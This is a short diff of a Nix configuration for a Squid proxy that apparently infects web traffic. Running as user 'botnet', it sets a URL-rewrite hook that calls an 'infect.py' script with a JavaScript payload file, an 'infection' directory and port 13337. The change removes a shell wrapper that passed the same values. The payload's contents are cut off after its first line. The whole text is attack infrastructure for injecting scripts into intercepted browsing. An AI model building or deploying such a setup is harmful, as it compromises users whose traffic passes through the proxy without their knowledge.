@@ -36,25 +36,8 @@ let
     pid_filename /run/squid/pid
     cache_effective_user botnet
 
-    url_rewrite_program ${infect}/infect
+    url_rewrite_program ${pkgs.python3}/bin/python ${./infect.py} ${payload} /var/quarantine 13337
   '';
-
-  infect = pkgs.stdenv.mkDerivation {
-    name = "infect";
-    exe = ''
-      #!/bin/sh
-      export PAYLOAD=${payload}
-      export INFECTION_DIR=/var/quarantine
-      export INFECTION_PORT=13337
-      exec ${pkgs.python3}/bin/python3 ${./infect.py}
-    '';
-    builder = builtins.toFile "builder.sh" ''
-      . $stdenv/setup
-      mkdir $out
-      echo "$exe" > $out/infect
-      chmod +x $out/infect
-    '';
-  };
 
   payload = builtins.toFile "payload.js" ''
     (function(){
